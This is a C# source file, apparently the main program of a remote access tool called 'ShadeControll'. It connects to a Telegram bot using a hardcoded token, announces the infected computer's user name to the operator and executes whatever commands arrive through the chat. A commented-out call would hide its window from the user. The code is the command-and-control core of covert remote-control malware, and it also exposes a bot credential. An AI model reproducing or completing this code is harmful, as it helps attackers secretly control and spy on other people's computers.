using System;
using System.Threading;
using System.Collections.Generic;
using ShadeControll.Commands;

namespace ShadeControll
{
    class Program
    {
        public static TelegramClient Client;
        static void Main()
        {
            
            //Ninja.Hide();

            Client = new TelegramClient("1774037430:AAHnjjeOUNvn-ZpyCCo_6mIhztp_GkagsVg");
            while(!Client.Connect()) { Thread.Sleep(1000); }
            Client.SendMessage("start wersja checkk");
            Client.SendMessage("Połączono z Komputerem - " + Environment.UserName + "\n /help");
            Client.NewMessage += Client_NewMessage;
            while (true) { Thread.Sleep(1000); }
        }

        private static void Client_NewMessage(string message)
        {
            Cmd _cmd = new Cmd(message);
            foreach(Command cmd in Command.AvailableCommands)
            {
                if(cmd.Name == _cmd.Name) { cmd.Execute(_cmd.Args); }
            }
        }
    }
}
